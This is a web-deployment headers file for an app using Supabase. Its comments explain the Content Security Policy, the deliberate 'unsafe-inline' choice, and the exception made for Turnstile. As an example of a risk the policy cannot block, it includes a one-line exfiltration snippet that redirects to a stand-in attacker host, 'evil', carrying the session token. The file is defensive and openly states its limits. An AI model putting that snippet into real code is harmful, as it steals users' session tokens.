# E6.7 - security headers for the Pages deployment.
#
# WHAT THIS DOES AND DOES NOT DO. script-src keeps 'unsafe-inline' because the whole app is three
# inline <script> blocks; locking that down needs per-deploy hashes, and a stale hash blocks EVERY
# script and takes the entire app down - worse than the risk it removes. So CSP here does not stop
# injected script from RUNNING. What it stops is the step that turns XSS into account takeover:
# reaching an attacker's server. The Supabase session token lives in localStorage, so connect-src
# and img-src are the directives that matter. Escaping at the sink (esc(), see index.html) is the
# actual fix; this is the second layer under it.
#
# Not airtight, and worth being honest about: CSP cannot block top-level navigation, so
# location = "https://evil/?t=" + token would still leave. This raises the bar; it is not a wall.

/*
  # challenges.cloudflare.com is Turnstile. BOTH the apex and *.challenges.cloudflare.com are
  # needed: the widget loads from the apex, but the interactive challenge talks to a per-region
  # subdomain (hagen.challenges.cloudflare.com and friends), and a CSP wildcard does not match
  # the apex nor the apex the subdomains. Allowing only the apex looked fine - the widget even
  # rendered - and then silently produced no token, because the one blocked request was the one
  # that solves the challenge. Verified by fetching both hosts from the live page.
  # Its script, the iframe it draws the widget in, and
  # the callback it posts the solved token to. Three directives, one host, nothing wider. This is
  # a deliberate widening of connect-src, which exists to stop XSS reaching an attacker - so it is
  # worth being explicit that the trade is: bot protection on signup, for one more allowed origin.
  Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' https://challenges.cloudflare.com https://*.challenges.cloudflare.com; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self' https://uvzxdeiiwswhthfaqhtb.supabase.co https://challenges.cloudflare.com https://*.challenges.cloudflare.com; frame-src https://challenges.cloudflare.com https://*.challenges.cloudflare.com; object-src 'none'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'; upgrade-insecure-requests
  X-Frame-Options: DENY
  Strict-Transport-Security: max-age=31536000; includeSubDomains
  X-Content-Type-Options: nosniff
  Referrer-Policy: strict-origin-when-cross-origin
  Permissions-Policy: geolocation=(), microphone=(), camera=(), payment=(), usb=()
